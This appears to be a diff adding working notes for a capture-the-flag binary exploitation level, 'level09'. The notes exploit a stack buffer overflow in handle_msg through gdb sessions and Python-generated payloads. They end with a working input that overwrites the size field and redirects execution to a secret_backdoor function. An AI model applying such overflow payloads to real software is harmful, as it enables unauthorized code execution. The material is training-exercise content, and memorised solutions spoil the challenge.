@@ -1,0 +1,37 @@
+
+(python -c "print('a' * 39 )"; cat) | gdb ./level09 -ex start -ex "b *0x0000555555554915" -ex continue -ex "x/16x 0x7fffffffe580"
+    Breakpoint 2, 0x0000555555554915 in handle_msg ()
+    ---Type <return> to continue, or q <return> to quit---
+    0x7fffffffe580: 0xf7dd4260      0x00007fff      0xf7a9608f      0x61616161
+    0x7fffffffe590: 0x61616161      0x61616161      0x61616161      0x61616161
+    0x7fffffffe5a0: 0x61616161      0x61616161      0x61616161      0x61616161
+    0x7fffffffe5b0: 0x0a616161      0x0000008c      0xffffe5d0      0x00007fff
+
+(python -c "print('a' * 128 + 'b' * 1024)"; cat) | gdb ./level09 -ex start -ex "b *0x0000555555554915" -ex continue -ex "x/16x 0x7fffffffe580"
+    Breakpoint 2, 0x0000555555554915 in handle_msg ()
+    ---Type <return> to continue, or q <return> to quit---
+    0x7fffffffe580: 0xf7dd4260      0x00007fff      0xf7a9608f      0x61616161
+    0x7fffffffe590: 0x61616161      0x61616161      0x61616161      0x61616161
+    0x7fffffffe5a0: 0x61616161      0x61616161      0x61616161      0x61616161
+    0x7fffffffe5b0: 0x61616161      0x00000061      0xffffe5d0      0x00007fff
+
+    """"
+    buff[140] (copied_msg)
+    (buff + 140 ) (username)
+    (buff + 180 ) (copied_msg size)
+    strncpy(buff,(char *)msg,(long)*(int *)(buff + 180));
+    """"
+
+(python -c "print('\xca' * 128 + 'a' * 1024)"; cat) | gdb ./level09 -ex run -ex "p secret_backdoor"
+    Program received signal SIGSEGV, Segmentation fault.
+    0x0000555555556161 in ?? ()
+    $1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+
+
+(python -c "print('\xca' * 128 + 'a' * 101 + 'b' * 50 + 'c' * 25 + 'd' * 15 + 'e' * 5 + 'f' * 3 + '\xaa\xbb')"; cat) | gdb ./level09 -ex run
+    Program received signal SIGSEGV, Segmentation fault.
+    0x000055555555bbaa in ?? ()
+
+
+(python -c "print('\xca' * 128 + 'a' * 199 + '\x8c\x48')"; cat) | ./level09
